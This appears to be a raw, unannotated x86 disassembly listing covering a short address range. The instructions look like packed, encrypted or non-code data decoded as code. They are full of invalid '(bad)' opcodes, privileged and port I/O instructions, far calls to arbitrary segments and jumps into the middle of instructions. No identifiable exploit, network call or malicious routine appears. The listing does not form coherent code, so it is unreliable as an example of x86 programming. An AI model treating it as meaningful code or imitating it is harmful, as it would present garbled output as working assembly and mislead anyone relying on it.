  4224a7:	adc    DWORD PTR [eax-0x49],ebx
  4224aa:	in     al,dx
  4224ab:	cmp    al,0x9c
  4224ad:	ficom  WORD PTR [ebp+0x120e6222]
  4224b3:	scas   al,BYTE PTR es:[edi]
  4224b4:	dec    ebx
  4224b5:	cmp    BYTE PTR [edx],ch
  4224b7:	loop   0x422526
  4224b9:	jbe    0x4224ae
  4224bb:	and    al,0x84
  4224bd:	fld    QWORD PTR [esi]
  4224bf:	push   0x8
  4224c1:	sub    BYTE PTR ds:0x360d9833,0xf9
  4224c8:	test   al,0x47
  4224ca:	neg    DWORD PTR fs:[ebx]
  4224cd:	inc    edx
  4224ce:	jb     0x4224f6
  4224d0:	push   esi
  4224d1:	fstp   TBYTE PTR [edi+0x25ccd36a]
  4224d7:	dec    ebp
  4224d8:	fdivp  st(1),st
  4224da:	(bad)
  4224de:	adc    esi,edx
  4224e0:	mov    esi,0x7283f855
  4224e5:	inc    eax
  4224e6:	aas    
  4224e7:	aam    0x5d
  4224e9:	dec    ebp
  4224ea:	call   0x457:0x38d1afbe
  4224f1:	jns    0x422499
  4224f3:	push   ebx
  4224f4:	push   ecx
  4224f5:	mov    cs,WORD PTR [ecx+0x20]
  4224f8:	jge    0x4224e7
  4224fa:	cmc    
  4224fb:	jl     0x422484
  4224fd:	xor    al,0xff
  4224ff:	push   ebx
  422500:	mov    ebp,0x3b57c19
  422505:	fisttp WORD PTR [esi-0x72820702]
  42250b:	scas   al,BYTE PTR es:[edi]
  42250c:	dec    ebx
  42250d:	sbb    bh,0x7c
  422510:	inc    ecx
  422511:	repnz push 0xcc6935e1
  422517:	ret    0x826e
  42251a:	cmp    eax,0xbe35f09e
  42251f:	imul   ebx,DWORD PTR [eax-0x1fc2816],0x11
  422526:	xchg   esp,eax
  422527:	xor    BYTE PTR [edi],dh
  422529:	or     ah,BYTE PTR [esi+0x6]
  42252c:	shl    BYTE PTR [edx+ecx*2-0x79],1
  422530:	mov    ebp,0xafe8d770
  422535:	stos   DWORD PTR es:[edi],eax
  422536:	cdq    
  422537:	mov    BYTE PTR [ebp+0x6b],cl
  42253a:	mov    eax,0x67d77c4a
  42253f:	add    al,0x3c
  422541:	inc    esp
  422542:	inc    edx
  422543:	gs iret 
  422545:	mov    cl,0x2e
  422547:	(bad)  [esi-0x68]
  42254a:	or     eax,0x3a1862ee
  42254f:	jg     0x42259a
  422551:	push   0xd06d1514
  422556:	sub    DWORD PTR [ecx],ebp
  422558:	jle    0x4225cb
  42255a:	or     dl,BYTE PTR [edx]
  42255c:	xor    al,0xda
  42255e:	jp     0x42255c
  422560:	jns    0x4224fa
  422562:	mov    bh,0xe2
  422564:	sbb    esi,edx
  422566:	rol    BYTE PTR [ecx],0x36
  422569:	arpl   WORD PTR [esi-0x5ecf583b],bp
  42256f:	pop    ds
  422570:	loope  0x42254b
  422572:	xchg   edi,eax
  422573:	call   0x7948:0x6aab370f
  42257a:	dec    eax
  42257b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42257c:	retf   0xb52b
  42257f:	jp     0x42256f
  422581:	inc    ebx
  422582:	and    al,0x79
  422584:	sti    
  422585:	xor    edx,DWORD PTR [edx]
  422587:	inc    ecx
  422588:	cmp    DWORD PTR [ebx+0x2ca0da57],esi
  42258e:	xchg   ecx,eax
  42258f:	add    DWORD PTR [eax],eax
	...
  4225f1:	add    BYTE PTR [eax],al
  4225f3:	add    BYTE PTR [edx-0x40887052],bl
  4225f9:	ja     0x4225f5
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx-0x3ccb5d08]
  422602:	sub    eax,DWORD PTR [edx+0x44]
  422605:	outs   dx,BYTE PTR ds:[esi]
  422606:	add    DWORD PTR [eax],eax
  422608:	add    al,0x1
  42260a:	add    BYTE PTR [eax],al
  42260c:	mov    dl,BYTE PTR [edi+ebp*8+0x64]
  422610:	mov    ebx,0x401098c
  422615:	int3   
  422616:	test   al,0xd0
  422618:	jl     0x422641
  42261a:	unpckhps xmm1,XMMWORD PTR [esi+0x282cf84f]
  422621:	popa   
  422622:	pop    ss
  422623:	rcl    BYTE PTR [eax+0x7d2db73f],0xb6
  42262a:	push   ss
  42262b:	mul    DWORD PTR [edx]
  42262d:	inc    ecx
  42262e:	mov    DWORD PTR [ebp+0xc],ebp
  422631:	push   edx
  422632:	out    0xec,eax
  422634:	ds mov ch,0x9b
  422637:	je     0x422672
  422639:	loopne 0x422666
  42263b:	push   ss
  42263c:	data16 daa 
  42263e:	or     al,0xd3
  422640:	and    bl,BYTE PTR [edi]
  422642:	xlat   BYTE PTR ds:[ebx]
  422643:	cmp    DWORD PTR [edx+ebx*1-0x4525b8e],esi
  42264a:	arpl   WORD PTR [edi+0x64e2d8b8],di
  422650:	sub    esp,DWORD PTR ds:0x72d5a66e
  422656:	add    eax,0x915caee4
  42265b:	dec    esp
  42265c:	ds cmp al,0x2f
  42265f:	dec    esp
  422660:	jno    0x422674
  422662:	call   0x563798ed
  422667:	jmp    0x42263c
  422669:	jg     0x422604
  42266b:	jle    0x422647
  42266d:	popf   
  42266e:	test   BYTE PTR [edi+0x429b4dce],ah
  422674:	xchg   edi,eax
  422675:	pop    ecx
  422676:	jno    0x4226be
  422678:	call   DWORD PTR [esi-0x43]
  42267b:	std    
  42267c:	pop    ds
  42267d:	and    bl,dl
  42267f:	out    dx,eax
  422680:	jg     0x422678
  422682:	xchg   edi,eax
  422683:	jecxz  0x4226f1
  422685:	add    al,0x70
  422687:	mov    ds:0x1cab95f7,al
  42268c:	sahf   
  42268d:	or     edi,edx
  42268f:	push   edx
  422690:	lods   al,BYTE PTR ds:[esi]
  422691:	adc    ebx,DWORD PTR [ecx+0x37]
  422694:	je     0x42261a
  422696:	inc    esi
  422697:	pop    edi
  422698:	jne    0x42264c
  42269a:	adc    ebp,DWORD PTR [ecx]
  42269c:	and    ebp,ebx
  42269e:	inc    ebp
  42269f:	mov    bl,0x1a
  4226a1:	jae    0x4226ec
  4226a3:	addr16 jle 0x42267a
  4226a6:	aam    0x39
  4226a8:	imul   edx,DWORD PTR [eax+0x6e],0xffffffd7
  4226ac:	sahf   
  4226ad:	int    0xc
  4226af:	jmp    FWORD PTR [edx+edi*2]
  4226b2:	inc    edi
  4226b3:	mov    dl,0x10
  4226b5:	in     al,0x2d
  4226b7:	jmp    0xe68a:0x25430cdd
  4226be:	clc    
  4226bf:	dec    esp
  4226c0:	mov    al,ds:0x19effe9c
  4226c5:	dec    eax
  4226c6:	mov    ds:0x92290cd2,eax
  4226cb:	in     al,0xc6
  4226cd:	sub    edx,esi
  4226cf:	or     dl,BYTE PTR [esi+0x7c]
  4226d2:	lea    edi,[ebx+edx*1]
  4226d5:	mov    esi,0xbafc6102
  4226da:	test   al,0x8f
  4226dc:	mov    esi,0x760e0f7f
  4226e1:	stc    
  4226e2:	test   eax,0x28ee076d
  4226e7:	xchg   BYTE PTR [edx],ch
  4226e9:	adc    DWORD PTR [edi-0x6],ebp
  4226ec:	inc    ebx
  4226ed:	xor    ecx,DWORD PTR [esi]
  4226ef:	push   edi
  4226f0:	test   eax,0x78619fa6
  4226f5:	cmc    
  4226f6:	mov    dl,0xfc
  4226f8:	dec    esp
  4226f9:	xchg   edi,eax
  4226fa:	sbb    BYTE PTR [edi],0x92
  4226fd:	les    ebx,FWORD PTR [edi]
  4226ff:	out    dx,al
  422700:	xchg   edx,eax
  422701:	cmp    bl,dl
  422703:	add    edi,DWORD PTR ds:0xdd58c8dd
  422709:	(bad)  
  42270a:	sub    ebx,DWORD PTR [edx-0x57]
  42270d:	test   al,0x50
  42270f:	adc    al,0x0
	...
  422771:	add    BYTE PTR [eax],al
  422773:	add    BYTE PTR [edi],ah
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x7f7f01c8
  422781:	mov    dl,BYTE PTR [ebx+0x16f4886]
  422787:	add    BYTE PTR [ecx+eax*1],al
  42278a:	add    BYTE PTR [eax],al
  42278c:	mov    bl,0x29
  42278e:	lods   al,BYTE PTR ds:[esi]
  42278f:	(bad)
  422792:	js     0x4227fd
  422794:	rcl    DWORD PTR [eax+0x5932d75e],cl
  42279a:	dec    ecx
  42279b:	lock add ebx,esi
  42279e:	jo     0x4227b8
  4227a0:	int    0xc6
  4227a2:	and    DWORD PTR [ebx+ecx*4-0x6f364acf],eax
  4227a9:	sub    al,0x88
  4227ab:	and    al,0xeb
  4227ad:	push   esp
  4227ae:	mov    eax,ds:0xf4f6df76
  4227b3:	xor    ecx,DWORD PTR [esp+esi*2-0x73]
  4227b7:	enter  0x8ad,0x76
  4227bb:	mov    ah,BYTE PTR [eax+esi*2+0xec9ebda]
  4227c2:	fwait
  4227c3:	push   0x8bf55510
  4227c8:	pop    ebp
  4227c9:	pop    ebx
  4227ca:	int3   
  4227cb:	ins    DWORD PTR es:[edi],dx
  4227cc:	push   edx
  4227cd:	outs   dx,BYTE PTR ds:[esi]
  4227ce:	stc    
  4227cf:	mov    ch,0x6a
  4227d1:	fwait
  4227d2:	jg     0x4227f9
  4227d4:	popa   
  4227d5:	aam    0xb7
  4227d7:	je     0x422812
  4227d9:	in     eax,dx
  4227da:	xor    al,0xf6
  4227dc:	fldenv [ebp-0xe]
  4227df:	loopne 0x42276d
  4227e1:	gs dec esi
  4227e3:	dec    edi
  4227e4:	push   ds
  4227e5:	xchg   edi,eax
  4227e6:	mov    bl,0xce
  4227e8:	stc    
  4227e9:	push   ss
  4227ea:	int    0xae
  4227ec:	daa    
  4227ed:	gs aad 0xf5
  4227f0:	inc    esi
  4227f1:	sbb    eax,0x812774bb
  4227f6:	inc    al
  4227f8:	add    eax,0xcfa797dd
  4227fd:	hlt    
  4227fe:	iret   
  4227ff:	test   BYTE PTR [esi+0x59],0x56
  422803:	lods   al,BYTE PTR ds:[esi]
  422804:	(bad)  
  422806:	xchg   ebp,eax
  422807:	push   ecx
  422808:	dec    edi
  422809:	aaa    
  42280a:	sbb    DWORD PTR [eax-0x3f],0xb4fffce9
  422811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422812:	xchg   esp,eax
  422813:	mov    bl,0x40
  422815:	and    esp,DWORD PTR ds:0x152027ac
  42281b:	and    edi,0x544562df
  422821:	(bad)  
  422822:	sar    DWORD PTR [edx],1
  422824:	in     eax,0x83
  422826:	dec    esi
  422827:	scas   al,BYTE PTR es:[edi]
  422828:	aad    0xdd
  42282a:	test   eax,0x4f658493
  42282f:	sub    eax,0x69e15f0
  422834:	sbb    eax,edx
  422836:	int    0xb9
  422838:	sbb    eax,0x38f5b1fa
  42283d:	lods   eax,DWORD PTR ds:[esi]
  42283e:	mov    fs,WORD PTR [edi-0x36]
  422841:	arpl   WORD PTR [edx-0x20],cx
  422844:	stos   DWORD PTR es:[edi],eax
  422845:	and    eax,0x67ee405c
  42284a:	sbb    DWORD PTR [edi+0x499b0e84],edx
  422850:	aaa    
  422851:	dec    ebx
  422852:	jmp    0x909c:0x741fda73
  422859:	lahf   
  42285a:	sub    ch,bh
  42285c:	retf   
  42285d:	xchg   esi,eax
  42285e:	into   
  42285f:	fld    TBYTE PTR [ebx-0x406b43c8]
  422865:	mov    esp,0x773b4474
  42286a:	sbb    eax,0x96a4e688
  42286f:	shl    BYTE PTR [eax+0xd],0xa
  422873:	mov    esp,0xc41e113b
  422878:	popa   
  422879:	fsubp  st(4),st
  42287b:	mov    ds:0x97617284,eax
  422880:	lea    ebp,[ecx+0x5]
  422883:	jg     0x4228c8
  422885:	sub    DWORD PTR ds:[ebp+0x6],eax
  422889:	fld    DWORD PTR [eax]
  42288b:	outs   dx,DWORD PTR ds:[esi]
  42288c:	sbb    eax,0x9bbb54
	...
  4228f1:	add    BYTE PTR [eax],al
  4228f3:	add    ch,cl
  4228f5:	cmp    DWORD PTR [eax-0x10680369],edi
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x42291d
  422901:	outs   dx,DWORD PTR ds:[esi]
  422902:	aas    
  422903:	or     eax,0x1704c
  422908:	add    al,0x1
  42290a:	add    BYTE PTR [eax],al
  42290c:	cmp    BYTE PTR [esi+0x5a],cl
  42290f:	adc    al,0x5e
  422911:	xor    BYTE PTR ds:[ebx],bl
  422914:	or     eax,0xa83974f1
  422919:	xchg   ecx,eax
  42291a:	xor    ebx,esp
  42291c:	or     BYTE PTR [edi+0x44bb43a9],cl
  422922:	jae    0x422976
  422924:	inc    esp
  422925:	(bad)  
  422926:	xor    al,0x2d
  422928:	jmp    0x4228e6
  42292a:	scas   al,BYTE PTR es:[edi]
  42292b:	xor    BYTE PTR [ecx],bl
  42292d:	mov    esp,0xc8e16c05
  422932:	xchg   BYTE PTR [ebp-0x2a9dc0ed],al
  422938:	mov    dh,0xdf
  42293a:	enter  0x94de,0xa6
  42293e:	mov    ah,0x3f
  422940:	sub    cl,ch
  422942:	in     al,dx
  422943:	lock in al,0xa1
  422946:	call   0xcb21:0x77bad63
  42294d:	clc    
  42294e:	aad    0x41
  422950:	push   edx
  422951:	sub    al,al
  422953:	gs sbb eax,0x879230a5
  422959:	pushf  
  42295a:	aam    0x90
  42295c:	cmp    ch,BYTE PTR [ecx-0x5f]
  42295f:	(bad)  [eax]
  422961:	sub    eax,edx
  422963:	(bad)  
  422964:	mov    edi,0x4ee8d24e
  422969:	(bad)  
  42296a:	mov    dl,0x4f
  42296c:	out    dx,eax
  42296d:	and    BYTE PTR [ebp+0x77],al
  422970:	dec    ebp
  422971:	mov    ds:0xfae10684,al
  422976:	test   DWORD PTR [ebp-0x20],0x59c96a18
  42297d:	jle    0x42295b
  42297f:	and    eax,0xd239d1c
  422984:	sbb    BYTE PTR [esi+ecx*4-0x65a175e6],bl
  42298b:	popf   
  42298c:	cmp    BYTE PTR [ebx+0x75a805c4],al
  422992:	mov    edi,0xb100acde
  422997:	jmp    0x4229dd
  422999:	mov    DWORD PTR [ebp+ebp*8-0x6bf75e32],edx
  4229a0:	loop   0x4229b5
  4229a2:	jo     0x4229fd
  4229a4:	inc    edx
  4229a5:	(bad)  [edi+0x31b2a249]
  4229ab:	and    eax,0x91ff38f6
  4229b0:	sbb    al,0xb9
  4229b2:	pop    ss
  4229b3:	dec    esi
  4229b4:	dec    eax
  4229b5:	xor    al,ah
  4229b7:	push   ecx
  4229b8:	cmp    DWORD PTR [edi+0x2e],edx
  4229bb:	or     eax,0x1a92780e
  4229c0:	adc    eax,0x5d630fde
  4229c5:	pop    ss
  4229c6:	push   es
  4229c7:	sbb    eax,0xa596ef66
  4229cc:	(bad)  
  4229cd:	sub    BYTE PTR cs:[edx],0x66
  4229d1:	add    cl,BYTE PTR [edx]
  4229d3:	inc    edx
  4229d4:	xchg   esi,eax
  4229d5:	imul   ebx,edx,0xffffff92
  4229d8:	mov    eax,0xd5253337
  4229dd:	ss mov dh,0x34
  4229e0:	inc    eax
  4229e1:	aas    
  4229e2:	mov    ch,0xdf
  4229e4:	or     al,0x97
  4229e6:	rcl    DWORD PTR [ebx-0x53],cl
  4229e9:	jnp    0x4229c3
  4229eb:	and    eax,0x4340e3d0
  4229f0:	jecxz  0x4229a4
  4229f2:	das    
  4229f3:	mov    dh,0x5c
  4229f5:	and    eax,0x5face945
  4229fa:	dec    esp
  4229fb:	lock jp 0x422a40
  4229fe:	inc    edi
  4229ff:	cmp    cl,BYTE PTR [ecx+0x1]
  422a02:	push   ebp
  422a03:	fisubr WORD PTR [ebx]
  422a05:	pop    es
  422a06:	retf   
  422a07:	or     al,BYTE PTR [ebx]
  422a09:	fstp   DWORD PTR [ebx]
  422a0b:	(bad)  
  422a0c:	push   esi
  422a0d:	clc    
  422a0e:	inc    ebx
  422a0f:	fild   DWORD PTR [eax]
	...
  422a71:	add    BYTE PTR [eax],al
  422a73:	add    BYTE PTR [esi-0x377e796],dl
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	push   0xffffffbf
  422a82:	dec    edi
  422a83:	pop    esp
  422a84:	push   eax
  422a85:	jno    0x422a88
  422a87:	add    BYTE PTR [ecx+eax*1],al
  422a8a:	add    BYTE PTR [eax],al
  422a8c:	xchg   BYTE PTR [ebp-0xf18bac0],cl
  422a92:	aam    0xff
  422a94:	pop    eax
  422a95:	addr16 aam 0xe2
  422a98:	ins    BYTE PTR es:[edi],dx
  422a99:	je     0x422acf
  422a9b:	pop    ebp
  422a9c:	bound  ecx,QWORD PTR [ebp+0x18]
  422a9f:	or     edi,ecx
  422aa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422aa2:	or     bh,al
  422aa4:	popa   
  422aa5:	imul   DWORD PTR [ebx+0x32f448de]
  422aab:	push   edi
  422aac:	mov    ebx,0x427369bd
  422ab1:	(bad)  
  422ab2:	dec    ecx
  422ab3:	imul   edi,DWORD PTR [edi],0x67b6e400
  422ab9:	mov    dl,0x37
  422abb:	in     eax,0x66
  422abd:	sti    
  422abe:	addr16 mov ebp,0xc399ecd6
  422ac4:	mov    edx,0xa82cd38
  422ac9:	pop    es
  422aca:	mov    cl,BYTE PTR [edx+0x21235164]
  422ad0:	mov    BYTE PTR [ebx-0x4e],0xb0
  422ad4:	fmul   QWORD PTR [eax+edi*8-0x1a]
  422ad8:	sar    BYTE PTR [esi-0x3f],1
  422adb:	adc    eax,0xc4e36515
  422ae0:	outs   dx,BYTE PTR ds:[esi]
  422ae1:	xchg   esp,eax
  422ae2:	push   cs
  422ae3:	xor    BYTE PTR [esi-0x79a2f5f4],bl
  422ae9:	and    al,0x17
  422aeb:	fsubr  DWORD PTR [ecx]
  422aed:	invd   
  422aef:	(bad)  
  422af1:	(bad)  
  422af2:	(bad)  
  422af4:	imul   edx,edx,0xffffffae
  422af7:	ret    
  422af8:	pop    esp
  422af9:	ficomp DWORD PTR [edi]
  422afb:	retf   0x9e30
  422afe:	inc    ebx
  422aff:	xchg   BYTE PTR [eax],ch
  422b01:	mov    ch,0x44
  422b03:	arpl   WORD PTR [esi-0x25d9ad6],si
  422b09:	or     dl,BYTE PTR [eax]
  422b0b:	mov    ecx,0x70cc4985
  422b10:	js     0x422adc
  422b12:	push   edi
  422b13:	push   0x5e1ea728
  422b18:	cmp    esi,DWORD PTR [ebx-0x52]
  422b1b:	cmp    bh,BYTE PTR gs:[edx-0x7]
  422b1f:	mov    di,0xb38a
  422b23:	or     esi,DWORD PTR [ebx]
  422b25:	neg    BYTE PTR [ecx+0x2dcadbc3]
  422b2b:	mov    dh,0x1f
  422b2d:	inc    ebx
  422b2e:	adc    eax,0x96f1280d
  422b33:	inc    ecx
  422b34:	fadd   QWORD PTR [ecx+0x1b3e16]
  422b3a:	pop    esi
  422b3b:	lock stc 
  422b3d:	inc    esp
  422b3e:	xor    eax,0xffa40d1b
  422b43:	cwde   
  422b44:	arpl   WORD PTR [ebp+0x12e6db1f],ax
  422b4a:	fxtract 
  422b4c:	or     DWORD PTR [edi+eiz*2+0x3b5ff4ff],eax
  422b53:	arpl   WORD PTR [ebp+0x68],bx
  422b56:	cdq    
  422b57:	mov    al,BYTE PTR [esi+0x6c]
  422b5a:	mov    cl,0xc
  422b5c:	dec    ecx
  422b5d:	retf   0x2846
  422b60:	nop
  422b61:	jp     0x422b3a
  422b63:	jmp    edx
  422b65:	sbb    al,0x1a
  422b67:	cdq    
  422b68:	cmp    DWORD PTR [esi+0x1e],ecx
  422b6b:	push   edx
  422b6c:	push   edi
  422b6d:	cmp    ebp,ecx
  422b6f:	dec    ecx
  422b70:	stos   BYTE PTR es:[edi],al
  422b71:	and    al,0x35
  422b73:	mov    eax,0x7974ca03
  422b78:	pop    ecx
  422b79:	or     BYTE PTR [edi],cl
  422b7b:	xchg   ebx,eax
  422b7c:	xor    esp,0xffffff83
  422b7f:	hlt    
  422b80:	jae    0x422b80
  422b82:	fist   DWORD PTR ds:0x722a477e
  422b88:	nop
  422b89:	push   cs
  422b8a:	adc    eax,ecx
  422b8c:	jmp    0x422bf9
  422b8e:	jecxz  0x422c00
	...
  422bf4:	inc    esp
  422bf5:	aaa    
  422bf6:	dec    edx
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x29b5b264]
  422c02:	in     eax,dx
  422c03:	adc    BYTE PTR [edx+esi*2+0x1],0x0
  422c08:	add    al,0x1
  422c0a:	add    BYTE PTR [eax],al
  422c0c:	pop    esp
  422c0d:	test   DWORD PTR [ecx],edx
  422c0f:	adc    eax,0x4f39ca2c
  422c14:	push   edx
  422c15:	stc    
  422c16:	xchg   DWORD PTR ss:[edi+esi*8],esp
  422c1a:	lea    esi,[eax-0x6c95e68f]
  422c20:	mov    al,ds:0x1ea5bcb2
  422c25:	idiv   BYTE PTR [eax+ebp*1]
  422c28:	hlt    
  422c29:	jle    0x422c39
  422c2b:	mov    dl,0xf5
  422c2d:	cdq    
  422c2e:	dec    esp
  422c2f:	fidiv  WORD PTR [ecx-0x57]
  422c32:	ins    DWORD PTR es:[edi],dx
  422c33:	jp     0x422c4f
  422c35:	push   0xffffffc0
  422c37:	mov    ebp,0x3ab19e00
  422c3c:	call   0xbb3adfdd
  422c41:	mov    ah,dl
  422c43:	sub    BYTE PTR [edi-0x3628fbc0],cl
  422c49:	mov    ds:0xab3bceb3,eax
  422c4e:	mov    al,0xff
  422c50:	jge    0x422be4
  422c52:	cmp    BYTE PTR cs:[edi-0x6b],al
  422c56:	scas   al,BYTE PTR es:[edi]
  422c57:	xchg   ebp,eax
  422c58:	adc    ch,BYTE PTR [ecx+0x6aeabcfd]
  422c5e:	call   0x9222:0xb893954
  422c65:	(bad)  
  422c66:	adc    al,0x77
  422c68:	and    bh,BYTE PTR [edx-0x7c49e9b4]
  422c6e:	fsub   DWORD PTR [edi]
  422c70:	leave  
  422c71:	inc    edi
  422c72:	push   ds
  422c73:	lods   eax,DWORD PTR ds:[esi]
  422c74:	dec    esi
  422c75:	or     dh,BYTE PTR [ebx-0x5821e5b]
  422c7b:	bound  edx,QWORD PTR [edi]
  422c7d:	push   edx
  422c7f:	add    ebx,DWORD PTR [edi+0x72]
  422c82:	xchg   edx,eax
  422c83:	dec    esp
  422c84:	sbb    eax,0xf9f3b294
  422c89:	mov    ebx,0xbe76e4c5
  422c8e:	or     al,0xe1
  422c90:	inc    edx
  422c91:	xor    cl,ch
  422c93:	out    0x65,al
  422c95:	xchg   esi,eax
  422c96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c97:	mov    ah,0x21
  422c99:	clc    
  422c9a:	in     eax,0x5b
  422c9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c9d:	mov    esi,0x8d2c97fe
  422ca2:	inc    edi
  422ca3:	xchg   ecx,eax
  422ca4:	mov    DWORD PTR [eax+0x64],edi
  422ca7:	pop    ecx
  422ca8:	jno    0x422cfd
  422caa:	mov    ebx,0xce1761ea
  422caf:	faddp  st(1),st
  422cb1:	jecxz  0x422c5e
  422cb3:	in     eax,0xf1
  422cb5:	xchg   edi,eax
  422cb6:	inc    esp
  422cb7:	mov    ecx,0x29975020
  422cbc:	add    eax,0x9cb150aa
  422cc1:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  422cc3:	add    dl,ah
  422cc5:	mov    DWORD PTR [eax],esi
  422cc7:	xchg   esi,eax
  422cc8:	xor    edi,DWORD PTR [esi+0x77dc3c3e]
  422cce:	cli    
  422ccf:	int3   
  422cd0:	push   0x38
  422cd2:	jl     0x422c6b
  422cd4:	std    
  422cd5:	xchg   ebp,eax
  422cd6:	idiv   DWORD PTR [edx-0x1a73735d]
  422cdc:	shl    dh,0xe0
  422cdf:	push   ebp
  422ce0:	(bad)  
  422ce1:	mov    dl,0xac
  422ce3:	cmp    BYTE PTR [edx],ah
  422ce5:	xor    DWORD PTR [esi],ebx
  422ce7:	xlat   BYTE PTR ds:[ebx]
  422ce8:	ins    DWORD PTR es:[edi],dx
  422ce9:	xchg   DWORD PTR [edx-0x9717b04],ecx
  422cef:	rcl    dh,cl
  422cf1:	mov    cl,0xe5
  422cf3:	add    eax,0xdeab3721
  422cf8:	cs mov edx,0x93b9635f
  422cfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cff:	or     dh,dh
  422d01:	ret    0xbf59
  422d04:	or     eax,0xbdd759ea
  422d09:	push   eax
  422d0a:	imul   ecx,DWORD PTR [ebx+eiz*2],0xa633db
	...
  422d71:	add    BYTE PTR [eax],al
  422d73:	add    BYTE PTR [edi+0x626d60bd],bh
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    eax,DWORD PTR [esp+esi*1+0x73589724]
  422d86:	add    DWORD PTR [eax],eax
  422d88:	add    al,0x1
  422d8a:	add    BYTE PTR [eax],al
  422d8c:	mov    al,0x90
  422d8e:	test   eax,0x4261931a
  422d93:	dec    eax
  422d94:	mov    dl,0xc3
  422d96:	ds sub eax,0xb1b321fd
  422d9c:	xchg   ebp,eax
  422d9d:	push   ebp
  422d9e:	stc    
  422d9f:	stc    
  422da0:	cmc    
  422da1:	rcr    BYTE PTR [ecx],1
  422da3:	xchg   DWORD PTR [edi],edx
  422da5:	in     al,0x6b
  422da7:	dec    ebp
  422da8:	jge    0x422e1b
  422daa:	inc    ecx
  422dab:	nop
  422dac:	stos   BYTE PTR es:[edi],al
  422dad:	mov    eax,ds:0x1055a375
  422db2:	test   eax,0xef7eb436
  422db7:	mov    ds:0xa52db52a,eax
  422dbc:	jmp    0xc426:0xb7d55534
  422dc3:	mov    esp,0xeb46b056
  422dc8:	push   edx
  422dc9:	mov    cl,dh
  422dcb:	(bad)  
  422dcc:	int3   
  422dcd:	rcl    DWORD PTR [ebx+0x17f4d477],0x56
  422dd4:	add    DWORD PTR es:[esi+0x5a],edi
  422dd8:	icebp  
  422dd9:	dec    esi
  422dda:	js     0x422db6
  422ddc:	pushf  
  422ddd:	gs std 
  422ddf:	daa    
  422de0:	inc    ebp
  422de1:	rol    BYTE PTR [edx-0x5c],cl
  422de4:	and    eax,0x30544c74
  422de9:	xchg   BYTE PTR [edi-0x73],al
  422dec:	daa    
  422ded:	jbe    0x422de0
  422def:	cwde   
  422df0:	adc    dh,bl
  422df2:	lahf   
  422df3:	mov    ecx,0x38191483
  422df8:	mov    ebp,esi
  422dfa:	jecxz  0x422dd0
  422dfc:	icebp  
  422dfd:	mov    edi,0x1d504f89
  422e02:	mov    bl,0xb
  422e04:	mov    ebx,0xd331f787
  422e09:	or     eax,DWORD PTR [ebx+0x6e]
  422e0c:	push   esp
  422e0d:	and    ebx,ecx
  422e0f:	mov    eax,ds:0x4479fdc5
  422e14:	lea    ebp,[esi+0x30fe92b7]
  422e1a:	daa    
  422e1b:	sbb    esi,ebx
  422e1d:	out    dx,eax
  422e1e:	es hlt 
  422e20:	push   ebx
  422e21:	(bad)  
  422e23:	call   0xfd38:0x1d784bb5
  422e2a:	idiv   BYTE PTR [ebx]
  422e2c:	sbb    edx,DWORD PTR [ebp-0xd52c5ed]
  422e32:	sub    ecx,eax
  422e34:	test   eax,0xbcf795c
  422e39:	mul    ch
  422e3b:	lea    edx,[eax-0x1067e71a]
  422e41:	(bad)  
  422e42:	mov    edx,0xb1d2c07a
  422e47:	sbb    BYTE PTR [ecx],cl
  422e49:	ja     0x422e6b
  422e4b:	cmc    
  422e4c:	iret   
  422e4d:	vmread DWORD PTR [ecx],eax
  422e50:	js     0x422e4a
  422e52:	dec    esp
  422e53:	sbb    DWORD PTR [esi],ecx
  422e55:	jno    0x422e0c
  422e57:	xchg   ebp,eax
  422e58:	mov    BYTE PTR [ebp+0x1c],0x38
  422e5c:	inc    edi
  422e5d:	outs   dx,DWORD PTR ds:[esi]
  422e5e:	and    al,0x4b
  422e60:	xlat   BYTE PTR ds:[ebx]
  422e61:	cdq    
  422e62:	xor    BYTE PTR [eax-0x3b78211b],ch
  422e68:	cmp    edx,DWORD PTR [eax]
  422e6a:	dec    edx
  422e6b:	jae    0x422e86
  422e6d:	mov    ds:0x4f136453,eax
  422e72:	dec    ecx
  422e73:	(bad)  
  422e75:	addr16 push 0xffffff83
  422e78:	mov    bl,0x91
  422e7a:	jbe    0x422e81
  422e7c:	in     eax,dx
  422e7d:	fs iret 
  422e7f:	mov    al,ds:0xa313823d
  422e84:	mov    WORD PTR [ecx+eax*1-0x45d3d987],gs
  422e8b:	push   ecx
  422e8c:	retf   0x863b
  422e8f:	jns    0x422e91
	...
  422ef1:	add    BYTE PTR [eax],al
  422ef3:	add    BYTE PTR [ebx-0x21e677ab],al
  422ef9:	fst    QWORD PTR [ebx+0x33b808df]
  422eff:	retf   0xa6de
  422f02:	sbb    ebp,DWORD PTR [esp+ebx*2+0x74]
  422f06:	add    DWORD PTR [eax],eax
  422f08:	add    al,0x1
  422f0a:	add    BYTE PTR [eax],al
  422f0c:	mov    bh,0xc2
  422f0e:	add    edx,ebp
  422f10:	mov    al,0xe7
  422f12:	imul   esi,ebp,0xf55ab75f
  422f18:	iret   
  422f19:	push   ds
  422f1a:	mov    ebx,DWORD PTR [edi]
  422f1c:	jae    0x422f82
  422f1e:	xchg   esi,eax
  422f1f:	in     eax,0x2e
  422f21:	cdq    
  422f22:	ss inc ecx
  422f24:	rcr    ebp,cl
  422f26:	sub    ch,ah
  422f28:	lds    ebx,FWORD PTR [edx+0x17]
  422f2b:	push   ds
  422f2c:	jg     0x422ef0
  422f2e:	adc    BYTE PTR [edi+eax*8],ch
  422f31:	int    0x4e
